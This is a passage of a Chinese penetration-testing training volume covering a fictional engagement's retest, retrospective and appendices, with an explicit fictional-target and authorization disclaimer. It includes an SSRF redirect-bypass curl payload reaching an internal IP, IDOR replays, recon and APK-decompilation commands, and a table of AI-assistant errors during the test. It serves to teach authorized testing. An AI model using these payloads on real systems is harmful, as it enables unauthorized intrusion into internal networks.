复测（retest）验证**整改有效性**，向后看旧漏洞；回归（regression）确认修复没引入新问题，向前看改动面——二者分开执行（VOL-07-08 B6）。复测的输入是上轮卡片：同样的请求、同样的前置、同样的 matcher。任何"顺手再深挖一下"都会破坏可比性——修复前后的两个响应必须只差"修复"这一个变量。F-02 的 302 变体是合规例外：它出现在**原样重放失败之后**（直连被拦），验证"拦截是否完整"本来就在原卡 matcher 的反证范围内，且仅执行一次。

### 9.2 【原理】四态判定的证据口径

四态不是印象，是 matcher 结果的分类学：**已修复** = 原卡 expected 不再命中且修复行为可归因（响应显示新校验）；**部分修复** = 主路径堵住、反证路径仍在（F-02：直连 IP 被拦但重定向可达；F-03：A 堵 B 未堵——本例按主口径计部分修复）；**未修复** = 原卡仍完整命中；**风险接受** = 客户书面确认暂不修复（必须有书面留痕，否则事后争议无法自证）。判定失败的常见假象是"不弹了=修好了"——可能是 WAF 拦截、环境变化或账号状态变化，必须换对照请求排除（VOL-07-08 B6 陷阱①）。

### 9.3 【操作】

```bash
# 复测执行：原卡重放（fresh 会话 + 占位符回填，与首测同法）
$ dsh replay poc/F-01.yaml --session fresh | tail -2
matcher: ALL-PASS → BUT expected failure… 判定：原响应现为 403 {"code":3002,"msg":"forbidden: not owner"}
```

> 🧭 **导游词（观察）**：这条 403 的 msg 写着 `forbidden: not owner`——修复的归因直接写进了错误信息（对象级归属校验上线）。
> 这种"错误信息自证修复"的运气不多见，遇到就原文截进证据，别转述。

```bash
# F-02：直连被拦
$ dsh replay poc/F-02.yaml --session fresh | tail -3
{"data":{"reachable":false,"error":"target address family not allowed"}}
# F-02 反证范围：重定向变体（自站 302 → 10.10.20.31）——仅此一次
$ curl -s -X POST https://oms.yunfan.example/api/v2/field/webhook/test -H "Authorization: Bearer $T" \
    -d '{"url":"https://oms.yunfan.example/redirect-demo?to=http://10.10.20.31:8080/"}'
{"code":0,"data":{"reachable":true,"status":200,"latency_ms":12,"body_head":"{\"service\":\"yf-taskcenter\"}"}}
```

四态判定表（复测报告核心）：

> 🧭 **导游词（现场感）**：直连被拦的那一秒你已经想写"已修复"——重定向一发出，`reachable:true` 又回来了。
> 复测的每一次"收工感"都必须过一遍原卡的反证路径；差一次，判定就翻车。

| 编号 | 首测结论 | 复测证据 | 四态 | 备注 |
|---|---|---|---|---|
| F-01 | IDOR 6.5 | 邻单 1043 → 403 not owner；本人单 200 维持正常功能 | ✅ 已修复 | 对象级归属校验上线 |
| F-02 | SSRF 4.6 | 直连私网 IP 被拦；302 变体仍可达（F-04 新条目） | 🟡 部分修复 | 建议白名单+禁跟随重定向（原建议原文） |
| F-03 | 审批流 6.5 | A 原语 403（角色+状态校验上线）；B 原语 PATCH 仍 200 且状态不重置 | 🟡 部分修复 | 金额快照排期 10 月底，客户书面确认 |
| O-1 | 登录限速（旧） | 5 次错误仍触发验证码+锁定 | ✅ 已修复（维持） | — |
| O-2 | 会话时长（旧） | refresh 8h 无失效机制维持；客户书面风险接受至 SSO 改造 | ⚠️ 风险接受 | 邮件留痕，附复测报告 |

`findings.jsonl` 第四条（复测新增，B′ 字段齐备）：

```jsonl
{"id":"F-04","title":"SSRF 修复不完整：302 重定向仍可触达内网地址",
 "target":"oms.yunfan.example","endpoint":"POST /api/v2/field/webhook/test",
 "dedup_key":"oms|POST|/api/v2/field/webhook/test|redirect-bypass",
 "rule_id":"WSTG-INPV-19","cvss":"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N","cvss_score":4.6,
 "business_impact":"同 F-02；修复未按建议采用白名单与禁重定向，黑名单方案可被合法自站 302 中转绕过",
 "exploitation_status":"validated","confidence":"Certain",
 "auth_context":"operator(ops_user01) → 自站 302 → 10.10.20.31:8080",
 "scope_check":"in-scope；中转地址为 oms.yunfan.example 自身路径，最终目标仍在 r1 允许的可达性验证清单内；仅执行 1 次",
 "counterevidence":"直连私网 IP 已被地址族校验拦截（修复部分有效）；body_head 仍截断 64 字节，影响面未扩大",
 "evidence":["evidence/F04-req-01.txt","evidence/F04-resp-01.txt"],"poc_ref":"poc/F-04.yaml",
 "remediation":"按 F-02 原建议收敛：域名白名单+解析后地址族校验+禁跟随重定向；增加 SSRF 告警规则（目标为私网段）","discovered_at":"2026-10-09T11:02:00+08:00"}
```

复测报告目录（增量文档，不覆盖首测）：

> 🧭 **导游词（节奏）**：F-04 出现后最想干的是把绕过变体矩阵跑全——302、DNS、编码各来一遍。
> 停。复测的边界是"原卡＋一次反证"；变体矩阵是下一轮合同的第一章，不是今天的免费加餐。

```text
1 复测范围与授权（沿用确认邮件附件）
2 首测发现重放结果（四态表 + 每条重放响应）
3 新增发现 F-04（卡片 + 证据）
4 回归抽查结论（v1 相邻接口 ×2 无异常）
5 遗留事项与下轮建议（needs_follow_up：同类面、订单链跳步、v2 生命周期）
```

### 9.4 【验证】

① 每行四态判定都有重放响应留档（`evidence/retest/`）；② 部分修复的两条都给出了"修复了什么/还剩什么"的双向证据；③ 风险接受有书面邮件附件；④ 复测报告增量仅含：四态表、F-04 新卡、回归抽查结论——与首测报告并存不覆盖。

### 9.5 【陷阱】

- **"不弹了"即判修复**：F-02 若只测直连 IP 会误判"已修复"——原卡的反证路径（变体）属于原判定范围，必须补测（本幕正是这样做的）。
- **复测窗口授权想当然**：沿用原范围≠沿用授权，复测开始前邮件确认窗口与身份（本次 2026-10-09 单日，journal 首行）。
- **回归面顺手扩大**：修复改动可能影响相邻接口，抽查 2 个即止——全面回归是下一轮合同的工作，免费做只会烧自己的预算还说不清边界。

### 9.6 【AI 位】

AI 能做：① 首测/复测响应逐字段 diff，自动标注"差异是否可归因于修复"（提示思路：*"对比两份响应，列出全部差异字段；对每个差异给出三种解释：修复引入/环境变化/业务数据变化，并指出验证哪种解释所需的对照请求"*）；② 四态表初稿与复测报告增量渲染。人必须守住：**四态判定签字权**——判定是合同责任，AI 的 diff 只是指纹，归因（修复引入 vs 环境变化）必须人用对照请求闭环；F-04 这类"新变体"是否入报告、如何措辞，由人按合同边界定。

### 9.7 幕末目录树快照 v8（复测后）

```text
2026-09-07-yunfan-oms/
├── poc/  + F-04.yaml          # 复测新增卡
├── evidence/retest/           # 复测重放报文 + 四态证据
├── findings.jsonl             # 4 行（F-01…F-04）
└── reports/
    ├── report.zh.md / report.pdf          # 首测 v1.2（含客户答疑修订）
    └── report-retest.zh.md / .pdf         # 复测报告（增量）
```

> **上帝视角旁白**：10.10.20.254 上那个未鉴权面板，客户在 9 月底的一次内部巡检中自己也发现了（比复测早一周）。F-02 的报告让他们的巡检清单多了一条"SSRF 视角的内网暴露面"——**一份克制的报告教会客户的，不只是修这三个洞。**

---

## 终幕 复盘（交战后一周）

交战结束一周，热度退去，账本摊开。复盘不是怀旧，而是把你这些天靠直觉做对的事，变成下次能靠清单做对的事。三张表、三步弯路、一张 AI 记分牌，一处都不许含糊——尤其是覆盖台账里那两行 needs_follow_up，它们就是下一份合同的形状。

### 0. 覆盖台账终态（coverage.json 渲染）

| 面（surface × 风险） | 终态 | 说明 |
|---|---|---|
| 攻击面测绘（DNS/CDN/存活/指纹） | reported | 第一幕 |
| 认证与会话（登录/刷新/过期/O-1） | reported | 第二幕 |
| 会话生命周期失效（O-2） | 风险接受（客户书面） | 复测结案 |
| 对象级鉴权：订单详情 | reported（F-01，复测已修复） | 第三幕 |
| 对象级鉴权：客户/退款列表等同类面 | **needs_follow_up** | H3-2 未闭合，下轮首日补 |
| 移动端 v2 面与未公开端点 | reported（F-02，复测部分修复+F-04） | 第四/五/九幕 |
| SSRF 与内网边缘（r1 限定动作） | reported（3+1 地址+负对照） | 第五幕 |
| 内网深入（端口/服务/利用） | ruled_out | 授权边界（r1），非技术取舍 |
| 审批业务流（状态机/角色/金额） | reported（F-03，复测部分修复） | 第六幕 |
| 并发竞态与异步出款攻击 | ruled_out | 非破坏原则（r2） |
| v3 网关（api.yunfan.example） | out_of_scope | scope 外，leads/L-03 登记 |
| 动态客户端分析（证书固定绕过） | ruled_out | 静态已充分，成本收益否决 |

零覆盖最后警告（渲染报告前跑过一遍）：

> 🧭 **导游词（观察）**：终态表里最值钱的不是 reported×6，而是两行 needs_follow_up——
> 诚实的空洞定义复购；把空洞填成"已测"的，定义的是下一次事故。无"静默跳过"项；needs_follow_up 两项已写入报告"覆盖度与局限性"章——这是给客户的诚实边界，也是下轮合同的工作说明书。

### 1. 预算总结

| 幕 | 计划 | 实际 | 差异原因 |
|---|---|---|---|
| 0 启动 | 4 | 3.5 | AI 辅助授权书解析省 0.5 |
| 1 外围 | 8 | 6 | 被动信息源充足；CDN 误判烧掉 2（见走错三步） |
| 2 认证后 | 10 | 11.5 | 会话过期返工 1.5（低级账） |
| 3 IDOR | 10 | 10 | 计划内 |
| 4 APK | 12 | 12 | 含证书固定弯路 1.5 |
| 5 SSRF | 10 | 10 | 探测克制，预算恰好 |
| 6 审批流 | 12 | 12 | 合法路径走查占 4 |
| 7 证据/卡片 | 6 | 6 | 计划内 |
| 8 报告 | 8 | 5 | 契约化渲染的红利 |
| 9 复测 | 4 | 4 | — |
| **合计** | **84** | **80.5** | 主窗口 76/80，复测 4 |

预算纪律的真实形态：

> 🧭 **导游词（节奏）**：看预算表别逐幕较劲——第二幕亏的 1.5 小时，是被第八幕的渲染红利抵回来的。
> 一人红队的预算纪律是总账不破，不是每幕不超。不是"每幕不超"，而是**总账不破**——第二幕多烧的 1.5 小时由第八幕的渲染红利抵回。一人红队超支的从来不是技术时间，是"没有台账导致重复劳动"的时间。

### 2. 走错的三步

| # | 事实 | 成本 | 教训 |
|---|---|---|---|
| 1 | 把 CDN 节点指纹当源站技术栈，误判"目标全靠 WAF"半天 | 2h | 归属判定必须 whois+响应头组合；单一信号不过 scope_check 同款纪律 |
| 2 | APK 已有静态答案仍强行动态抓包，卡证书固定 | 1.5h | 目的决定手段（VOL-07-08 A2）；"完整性仪式感"不是测试目标 |
| 3 | F-03 首次演示后未立即固化原始报文，次日复现重走全流程 | 1h | 证据先行：任何一次"成功响应"出现的那一刻就该落盘，而不是"等结论确认后补" |

### 3. AI 协作得分与失分

| 环节 | AI 贡献（得分） | AI 事故（失分） | 人工守住的成本 |
|---|---|---|---|
| 第 0 幕 授权解析 | 限定词→规则对照表 20 分钟出稿 | 把"复测授权沿用"误读为"无限期" | 澄清并写 amendments +0.5h |
| 第一幕 旧报告结构化 | O-1/O-2/O-3 清单即抄即用 | — | 逐条核对原文 0.3h |
| 第二幕 路由提取 | 8MB JS→应然矩阵草表 | 补全了 3 个"从未出现"的角色组合（幻觉格） | 未知格重标 0.4h |
| 第三/五幕 脚本与表格 | 采样/脱敏脚本、指纹分层表 | 脚本一度无节流（会触发限速） | 代码评审发现 0.2h |
| 第四幕 APK 分桶 | 3000+ 文件→端点/密钥清单 | 引用了不存在的文件路径 2 条（10% 抽查抓获） | 抽查 0.5h |
| 第六幕 差集与状态图 | 状态动词差集直接命中审批接口 | — | 资金动作人在环 0 |
| 第七/八幕 卡片与报告 | 草稿→渲染管线，报告幕省 3h | matcher 写成"预期"而非"复现"（1 处） | 独立重放门拦截 0.3h |
| 第九幕 响应 diff | 逐字段差异表 15 分钟 | 把环境差异误归因为"修复生效" | 对照请求闭环 0.5h |

净结论：AI 省约 12–14 小时（相当于 1.5 个工作日），但**每一次失分都发生在"判定与归因"环节**，全部靠人工纪律（scope_check、未知格重标、抽查、独立重放、对照请求）拦截——与 VOL-09C 的结论一致：AI 交产能，人守判定。

### 4. 十幕节奏的元规律

回看全程：**每一幕只做一件事，且都由上一幕的未闭合缺口驱动**——边界（0）→攻击面（1）→身份矩阵（2）→对象级差分（3）→客户端反哺（4）→服务端侧信道（5）→业务流（6）→证据（7）→交付（8）→闭环（9）。上帝视角的价值不是预知答案，而是任何时候都能回答三个问题：我已经知道什么、我假设什么、下一个最小实验是什么。这套节奏加上工程契约（目录即状态），就是一人红队以一敌十的全部秘密。

### 5. 可迁移的五条原则（下一次交战开工前重读）

1. 授权文本逐字翻译成可执行规则，比多测十个接口更值钱。
2. 负结果也是资产：直连不可达直接催生了第五幕的合规路径。
3. 应然矩阵先行：没有"应该怎样"，差分就没有靶子。
4. 证据先于结论落盘；结论先于报告签字。
5. 克制写进台账（ruled_out），冲动只写进事故报告。

---

## 附录 A 全程命令速查

| 阶段 | 命令 | 用途（本卷出处） |
|---|---|---|
| 契约 | `mkdir -p eng/{secrets,sessions,assets,leads,coverage,poc,recon,evidence,logs,handoff,reports}` | 目录骨架（第 0 幕） |
| 契约 | `echo '{"ts":…}' >> journal.jsonl` | 每步落账（全卷） |
| 侦察 | `dig +short <域>` / `whois <IP> | grep -iE "orgname|netname"` | 解析与归属（第一幕） |
| 侦察 | `curl -s "https://crt.sh/?q=%25.<域>&output=json" | jq -r '.[].name_value' | sort -u` | 子域（先过 scope_check） |
| 侦察 | `httpx -u <域> -title -tech-detect -status-code -rate-limit 10` | 存活与指纹（第一幕） |
| 侦察 | `nmap -sn <段> --max-rate 30 -oA recon/backend-direct` | 可达性（仅 r1 允许的动作） |
| 认证后 | `echo '<jwt>' | cut -d. -f2 | base64 -d` | claims 目检（第二幕） |
| 认证后 | `cat app.js | grep -oE 'path:"[^"]+"|roles:[[^]]*]' | paste - -` | 前端路由→应然矩阵 |
| IDOR | `python3 poc/f01_idor_sample.py <token>` | 限速采样+脱敏（第三幕） |
| APK | `apksigner verify --print-certs <apk>` / `jadx -d src <apk> --no-res` | 验签+反编译（第四幕） |
| APK | `grep -rhoE 'https?://[a-zA-Z0-9./_-]+' src | sort -u` | URL 分桶（VOL-05 §2.4） |
| SSRF | `curl -s -X POST <api> -H "Authorization: Bearer $T" -d '{"url":"http://10.10.20.31:8080/"}'` | 服务端侧信道（第五幕） |
| 逻辑 | 状态机对照表：期望（应然矩阵）×实测（Burp）×证据（条目号） | 第六幕 |
| 证据 | `sha256sum evidence/* > evidence/MANIFEST.sha256` | 哈希清单（第七幕） |
| 证据 | `grep -rE "密码|Bearer eyJ|AK-" reports/ findings.jsonl` | 脱敏终检（第七/八幕） |
| 报告 | `cvss-local calc "CVSS:3.1/AV:N/…"` | 本地重算定级（第八幕） |
| 复测 | `dsh replay poc/F-0X.yaml --session fresh` | 原卡重放（第九幕） |

## 附录 B 交战目录最终树

```text
~/redteam-engagements/2026-09-07-yunfan-oms/
├── engagement-snapshot.json      # skill/契约版本；resume 兼容性检查
├── scope.yaml                    # 宪法：allowed/rules r1–r5/amendments（追加制）
├── creds.yaml / secrets/         # 凭据元数据 / 真值（0600，gitignore）
├── sessions/ops01.json           # 会话快照+过期检测+刷新脚本
├── state.json                    # 派生缓存（phase=complete）
├── journal.jsonl                 # 61 行：append-only 第一真相
├── hypotheses.jsonl              # 全部假设终态（Certain/Firm/pending/ruled_out）
├── assets/
│   ├── assets.jsonl              # 实体总表：host/endpoint/role/cred-lead/fact
│   ├── attack_surface.json / endpoints.jsonl / role_model.md / apk-intel.json
├── findings.jsonl                # 4 行：F-01…F-04（B′ 契约字段齐备）
├── leads/                        # L-01 AK / L-03 越界资产 / L-04 口令策略 / 旧报告清单
├── coverage/
│   ├── coverage.json             # 负空间台账（终态见终幕表）
│   └── coverage-gaps.jsonl       # 因边界/预算未测项逐条留痕
├── poc/
│   ├── F-01.yaml  F-02.yaml  F-03.yaml  F-04.yaml   # 全部过独立重放门
│   ├── f01_idor_sample.py
│   └── replay.log
├── recon/                        # dig/httpx/nmap/apk-src 原始输出（禁整读，点查）
├── evidence/
│   ├── MANIFEST.sha256
│   ├── F01-*  F02-*  F03-*  F04-*
│   └── retest/                   # 复测重放与四态证据
├── logs/                         # commands.log / toolbox.json
├── handoff/                      # PHASE-N-SUMMARY.md（≤200 行）
└── reports/
    ├── report.zh.md / report.pdf             # 首测 v1.2
    └── report-retest.zh.md / .pdf            # 复测（增量，不覆盖首测）
```

## 附录 C 审计员视角对照：同样的漏洞在源码里长什么样

给源码审计出身的你一面镜子：三个发现在白盒下的形态（伪代码，形态对齐 VOL-04 源码联动卷）。规律：**黑盒的每个"响应异常"，在源码里都是一行被省略的校验**。

| 发现 | 黑盒信号（本卷） | 源码形态（伪代码） | 审计员的传统信号 |
|---|---|---|---|
| F-01 IDOR | 跨用户 200+归属字段 | `Order o = orderDao.findById(orderId); // 缺 if (!o.creatorUid.equals(session.uid)) throw …` | DAO 主键查询后无归属断言；controller 里 `@PathVariable` 直接进 DAO |
| F-02 SSRF | webhook url 任意+回显指纹 | `Request r = new Request.Builder().url(userUrl).build(); client.newCall(r).execute(); // 无地址族/白名单校验，未禁 redirect` | HTTP 客户端 sink 的 url 来源是请求体；重定向开关默认开 |
| F-03 审批流 | 状态跳跃+金额漂移 | `public Result finalApprove(id){ refund = dao.get(id); refund.setState(FINAL); dao.update(refund); // 无 role/state/转移表校验；PATCH 未重置 state、无快照 }` | 状态转移接口缺状态前置条件；可变字段与状态机解耦；审计日志切面缺失 |

三行对照也解释了为什么**黑盒更容易抓到 F-03**（真实业务流差分一眼可见，而白盒里"谁在什么状态下能调它"分散在几十个调用点），**白盒更容易抓到 F-01 的蔓延面**（`findById` 模式可全局 grep，H3-2 一分钟闭环）。这就是 VOL-04 的主张：两视角互补，一人红队应把审计本能转化为"响应里的省略行"嗅觉。

### C.1 如果客户下一轮给你源码（联动 VOL-04）

本卷三个洞的源码排查起点只有三处：`grep -rn "findById(" --include="*Controller*"`（对象归属断言缺失）、HTTP 客户端封装类的 `url` 参数来源（SSRF sink）、状态机接口的入参与 `setState` 的距离（校验内聚性）。源码联动的正确用法不是重读全部代码，而是**把黑盒 findings 反向定位成代码位置，再沿同一模式全局搜蔓延面**——F-01 的 H3-2（customers 同类面）在白盒下是十秒钟的事。

---

## 本卷小结

- 一场交战 = **边界（scope）→攻击面（assets）→身份（矩阵）→差分（越权）→侧信道（SSRF/内网边缘）→业务流（逻辑）→证据（卡片）→交付（报告）→闭环（复测四态）**的因果链，每步由上一步的未闭合缺口驱动（VOL-07-08 A1）。
- 上帝视角不在战时，在工程：journal/assets/coverage 让你**事后**拥有全局——目录即状态契约（VOL-09C §3.3）。
- 克制是能力：r1/r2/r3 三条红线各自"少做了什么"，全部转化为覆盖台账的 ruled_out 与客户信任。
- AI 交产能（约省 1.5 个工作日），人守判定（scope/定级/归因/资金动作/四态签字），每一分都体现在台账里（VOL-09A/B/C）。

> 交叉引用：Web 打点细节见 VOL-01/VOL-02；内网深入（本卷刻意止步之处）见 VOL-03；源码联动见 VOL-04；安装包流水线见 VOL-05；工具链锁定见 VOL-06；决策模型、POC 卡与 B2/B6 交付规范见 VOL-07-08；AI 协作纪律见 VOL-09A/B/C。
>
> **虚构声明（重复）**：本卷全部目标、域名、IP、账号、输出均为虚构教学构造（`.example` 保留域、RFC 5737 测试段），不指向任何真实机构；对真实目标执行文中任何操作前，你必须持有书面授权。